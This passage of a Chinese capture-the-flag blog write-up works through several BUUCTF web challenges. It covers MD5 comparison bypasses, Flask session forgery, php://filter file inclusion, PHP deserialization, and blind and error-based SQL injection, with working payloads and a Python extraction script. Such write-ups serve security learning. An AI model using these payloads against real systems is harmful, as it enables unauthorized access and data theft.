class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure><p>他们的MD5都是0</p><p>最后一关源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接拿数组绕过就好</p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200903205415553.png" alt="image-20200903205415553"></p><h3 id><a href="#" class="headerlink" title=" "></a> </h3><h1 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h1><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>学习一下tornado</p><p><a href="https://blog.csdn.net/belalds/article/details/80575755" target="_blank" rel="noopener">https://blog.csdn.net/belalds/article/details/80575755</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""主路由处理类"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""对应http的get请求方式"""</span></span><br><span class="line">        self.write(<span class="string">"Hello Itcast!"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">        (<span class="string">r"/"</span>, IndexHandler),</span><br><span class="line">    ])</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure><ol><li>tornado.web</li></ol><p>tornado的基础web框架模块</p><ul><li><strong>RequestHandler</strong></li></ul><p>封装了对应一个请求的所有信息和方法，write(响应信息)就是写响应信息的一个方法；对应每一种http请求方式（get、post等），把对应的处理逻辑写进同名的成员方法中（如对应get请求方式，就将对应的处理逻辑写在get()方法中），当没有对应请求方式的成员方法时，会返回“<strong>405: Method Not Allowed</strong>”错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""主路由处理类"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span>  <span class="comment"># 我们修改了这里</span></span><br><span class="line">        <span class="string">"""对应http的post请求方式"""</span></span><br><span class="line">        self.write(<span class="string">"Hello Itcast!"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">        (<span class="string">r"/"</span>, IndexHandler),</span><br><span class="line">    ])</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure><ul><li><strong>Application</strong></li></ul><p>Tornado Web框架的核心应用类，是与服务器对接的接口，里面保存了路由信息表，其初始化接收的第一个参数就是一个路由信息映射元组的列表；其listen(端口)方法用来创建一个http服务器实例，并绑定到给定端口（<strong>注意：此时服务器并未开启监听</strong>）。</p><p><strong>总结Tornado Web程序编写思路</strong></p><ol><li>创建web应用实例对象，第一个初始化参数为路由映射列表。</li><li>定义实现路由映射列表中的handler类。</li><li>创建服务器实例，绑定服务器端口。</li><li>启动当前线程的IOLoop。</li></ol><h2 id="HCTF-2018-admin（flask中session伪造）"><a href="#HCTF-2018-admin（flask中session伪造）" class="headerlink" title="[HCTF 2018]admin（flask中session伪造）"></a>[HCTF 2018]admin（flask中session伪造）</h2><p>发现只能admin才能登录获取flag</p><p>主要学习一下flask中的session伪造</p><p><strong>session一般存储在服务器，而在flask中，session是存储在客户端，并且flask中对数据仅仅进行了签名，签名主要目的是防止篡改，但却无法防止被读取。所以就会产生一些安全问题。</strong></p><p>在这个题中，我们就可以根据这个来解题</p><p>先来看一下自己注册用户test的cookie，之后进行解码，可以参考p牛的脚本，也可以上github上找flask-session-manager之后done下来</p><p>我这里用的是python2.7</p><p>解密:<code>python flask_session_manager2.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEY</code><br> 加密:<code>python flask_session_manager2.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kEGPgjAQhf_KZs4eBJcLiZdNkUjSIZBKM70Y10VKS90EMCjG_77VTbxN8mbe-97cYX_q60FDPPaXegH79gfiO3x8Qwzc8WUuN45kaXLRGWSVphC1Mk2Uy6ojWYRosg7DTYuzNmi0Ib_HjXY8pJWS6Ge6cZlc8zQJlKlabjLHWWn5vHFcFCtMdzeabcRd5hTbTWjsFV0RkdtFitlJCZ_FmiuZUpOgT5KVU6IIFPM8YRKQ0JYLWsNjAcehP-3HX1uf3xWQFQGm2-l5ygW2Sm5DlVYdTynC2WN4TBJf3RORRGbRHG-qWb_sWndo6rdTmWSzmP6V88F5AcZ6GGEBl6HuX2-DYAmPP9bObbw.X1R2Pw.c_FhTL4z1ufpRuGX5k2__AoFhBU</span><br><span class="line">&#123;u&#39;csrf_token&#39;: &#39;4454b0a6813beb6dee0f974d3f7a0e1a1a2d672f&#39;, u&#39;user_id&#39;: u&#39;10&#39;, u&#39;name&#39;: u&#39;test&#39;, u&#39;image&#39;: &#39;DBsO&#39;, u&#39;_fresh&#39;: True, u&#39;_id&#39;: &#39;2c49afadc99c45accaf899eead662e7ab78c68ca9c28f3f7ecc2621a18a5f5b22f04d31f1474e2c992bfd506916d9be9d90e89881b4aa68aefe45d9c7a5a8d16&#39;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kE-LwjAQxb_KMmcPtm4vgpcltVjIlJbYMLmIf2rTpHGhVVorfveNLngbeDPv_d48YHfuql7D8trdqhnsmhMsH_B1gCVwx-eZXDuShclEa5CVmkLUytRRJsuWZB6iSVsM1w1O2qDRhvweN9rxkBZKop_pzmU8ZkkcKFM23KSOs8Lyae24yBeYbO802Yi71Cm2HdDYEV0ekdtGitlBCZ_F6pFMoUnQN8nSKZEHinmeMA5IaMsFreA5g2PfnXfXX1tdPhWQ5QEmm-F1ygU2Sm5ClZQtTyjCyWN4TBI_7QuRRGrRHO-qXr3tGrevq49TEaeTGP6Vy955AfYn11xgBre-6t5_g2AOzz9EfG4F.X1R5Og.sdx02y47Ad8Rck93GVBwZ0RVTOs</span><br></pre></td></tr></table></figure><p>之后进行改密码登录就可以。</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="[极客大挑战 2019]Secret"></a>[极客大挑战 2019]Secret</h2><p>一直查看源码最后只需要用一个文件包含就可以读出flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>直接读取flag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="极客大挑战-2019-PHP（简单反序列化）"><a href="#极客大挑战-2019-PHP（简单反序列化）" class="headerlink" title="[极客大挑战 2019]PHP（简单反序列化）"></a>[极客大挑战 2019]PHP（简单反序列化）</h2><p>考察php反序列化，先下载www.zip里面有三个文件，其中有class.php，index.php，flag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>其中逻辑就是密码为100，并且username=’admin‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $username = <span class="string">"admin"</span>;</span><br><span class="line"><span class="keyword">private</span> $password = <span class="string">"100"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Name();</span><br><span class="line">$a = serialize($a); </span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line"><span class="comment">//O:4:"Name":3:&#123;s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";&#125;</span></span><br></pre></td></tr></table></figure><p>最后进行url编码就行。</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;  <span class="comment">//text的内容为welcome to the zjctf</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;  <span class="comment">//file的内容不能包含flag</span></span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);  <span class="comment">//反序列化</span></span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看源码知道共有三个参数，所以依次判断</p><p>text的内容为welcome to the zjctf，所以我们可以用data协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</span><br><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure><p>之后是file，题中已经提示了useless.php，说明我们首先得拿出源码，之后包含这个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure><p>拿出源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>之后就是password，很明显是序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5bfc7735-e6c3-4e4b-9612-573138d921bd.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>查看源码就有flag</p><h2 id="网鼎杯-2018-Fakebook（报错注入和反序列化）"><a href="#网鼎杯-2018-Fakebook（报错注入和反序列化）" class="headerlink" title="[网鼎杯 2018]Fakebook（报错注入和反序列化）"></a>[网鼎杯 2018]Fakebook（报错注入和反序列化）</h2><p>首先发现信息泄露</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;user.php.bak</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//创建一个curl资源</span></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">       <span class="comment">//设置url和相应的选项</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">      <span class="comment">//抓取url并传递给浏览器</span></span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">//关闭curl资源，并且释放系统资源</span></span><br><span class="line">        curl_close($ch);</span><br><span class="line"><span class="comment">//唯一的参数是curl_init()函数返回的句柄</span></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找了好长时间，找不到注入点</p><p>后来发现，登录之后，可以查看一些信息</p><p>并且很重要的是view.php中no是可以注入的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic =<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">""</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)"</span>.format(i,j);</span><br><span class="line">        r = requests.get(url=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Fatal"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            flag += str(chr(j))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br><span class="line">payload = <span class="string">"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)"</span>.format(i,j);</span><br><span class="line"><span class="comment">#users</span></span><br><span class="line">payload = <span class="string">'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name="users"),&#123;&#125;,1))=&#123;&#125;,2,3)'</span>.format(i,j);</span><br><span class="line"><span class="comment">#no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span></span><br><span class="line">payload = <span class="string">'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(data) from users),&#123;&#125;,1))=&#123;&#125;,2,3)'</span>.format(i,j);</span><br><span class="line"><span class="comment">#O:8:"UserInfo":3:&#123;s:4:"name";s:5:"admin";s:3:"age";i:11;s:4:"blog";s:8:"pz1o.top";&#125;</span></span><br></pre></td></tr></table></figure><p>其实也可以报错注入，但当时以为0x7e被ban了之后就不能报错了，tcl</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1%20and%20extractvalue(1,concat(%27$%27,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(<span class="keyword">database</span>()))))%<span class="number">23</span></span><br><span class="line">fakebook</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(%<span class="number">27</span>$%<span class="number">27</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>())))%<span class="number">23</span></span><br><span class="line"><span class="keyword">users</span></span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(%<span class="number">27</span>$%<span class="number">27</span>,(<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">group_concat</span>(column_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span><span class="keyword">where</span>%<span class="number">20</span>table_name=%<span class="number">27</span><span class="keyword">users</span>%<span class="number">27</span>)))%<span class="number">23</span></span><br><span class="line"><span class="keyword">no</span>,username,passwd,<span class="keyword">data</span>,<span class="keyword">USER</span>,CU</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span> extractvalue(%<span class="number">27</span>$%<span class="number">27</span>,<span class="keyword">concat</span>(%<span class="number">27</span>$%<span class="number">27</span>,(<span class="keyword">select</span> <span class="keyword">data</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">users</span>)))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>做到这其实就不会做了。。。看大师傅的wp才知道可以no参数注入反序列化</p><p>其中payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 